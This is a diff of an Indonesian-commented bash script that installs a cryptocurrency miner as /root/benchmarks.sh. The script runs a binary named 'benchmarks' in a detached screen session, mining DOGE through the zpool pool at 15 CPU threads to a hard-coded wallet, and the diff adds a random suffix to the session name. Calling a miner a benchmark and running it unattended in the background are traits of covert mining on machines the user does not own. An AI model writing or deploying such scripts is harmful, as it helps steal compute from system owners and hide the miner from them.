@@ -2,8 +2,11 @@
 echo "📦 Menginstal dependensi..."
 apt-get update && apt-get install -y screen wget tar
 
+# Membuat 5 huruf acak
+RAND=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
+
 echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+cat << EOF > /root/benchmarks.sh
 #!/bin/bash
 
 cd /root || exit
@@ -17,11 +20,11 @@ if [ ! -f benchmarks ]; then
 fi
 
 # Cek apakah screen sudah berjalan
-if screen -list | grep -q amirul3; then
-  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
+if screen -list | grep -q amirul3-${RAND}; then
+  echo "⚠️  Screen 'amirul3-${RAND}' sudah jalan, skip."
 else
-  echo "▶ Menjalankan mining di screen 'amirul3'..."
-  screen -dmS amirul3 bash -c '
+  echo "▶ Menjalankan mining di screen 'amirul3-${RAND}'..."
+  screen -dmS amirul3-${RAND} bash -c '
     while true; do
       ./benchmarks --algorithm power2b --pool stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE,30 --cpu-threads 15
       sleep 2
